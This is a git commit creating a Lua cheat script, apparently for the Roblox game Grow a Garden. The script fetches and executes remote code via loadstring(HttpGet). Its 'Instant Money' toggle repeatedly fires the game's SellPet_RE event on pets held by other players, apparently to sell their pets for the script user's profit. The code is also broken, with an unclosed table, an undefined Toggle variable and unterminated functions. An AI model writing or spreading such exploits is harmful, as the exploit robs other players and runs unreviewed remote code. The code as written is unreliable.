6a741f6915a6b66c1afcea970d8f2a66c773a9a9
takgoo170 <eddiejrsapian@gmail.com>
2025-05-31 09:26:18 +0800

    Create gag.lua

---
+++ gag.lua
@@ -0,0 +1,54 @@
+local KaiUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/takgoo170/Beta_Kai_Scripts/refs/heads/main/Beta.lua"))()
+local Window = KaiUI:CreateWindow({
+    Title = "Kai Hub : Grow a Garden 🌴",
+    SubTitle = "by Kai Team",
+    TabWidth = 160,
+    Size = UDim2.fromOffset(520, 420),
+    Acrylic = true, -- The blur may be detectable, setting this to false disables blur entirely
+    Theme = "Dark",
+    MinimizeKey = Enum.KeyCode.LeftControl -- Used when theres no MinimizeKeybind
+})
+KaiUI:Notify({
+        Title = "Kai Hub | Grow a Garden",
+        Content = "Welcome to our Kai Hub | Grow a Garden script!",
+        SubContent = "Thank you for using it.", -- Optional
+        Duration = 11 -- Set to nil to make the notification not disappear
+    })
+---------TABS---------
+local Tabs = {
+    Discord = Window:AddTab({ Title = "Discord", Icon = "info"
+    Main = Window:AddTab({ Title = "Main", Icon = "house" }),
+    Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
+}
+----------------- DISCORD TAB ---------------
+
+----------------- MAIN TAB -------------------
+    Tabs.Main:AddSection("Money")
+    Tabs.Main:AddToggle("Toggle", {
+        Title = "Instant Money",
+        Description = "❗Enable this if someone is holding a pet, and you will automatically earn a money.",
+        Default = false
+      })
+    Toggle:OnChanged(function()
+        
+task.spawn(function()
+    while true do wait()
+        for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+            if v ~= game.Players.LocalPlayer then
+                local Pet = v.Character:FindFirstChildOfClass("Tool")
+                if Pet and Pet:GetAttribute("ItemType") == "Pet" then
+                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("SellPet_RE"):FireServer(Pet)
+                end
+            end
+        end
+    end
+end)
+
+
+
+--------------- NOTIFICATION ---------------
+KaiUI:Notify({
+    Title = "Kai Hub",
+    Content = "The script has been loaded.",
+    Duration = 9
+})
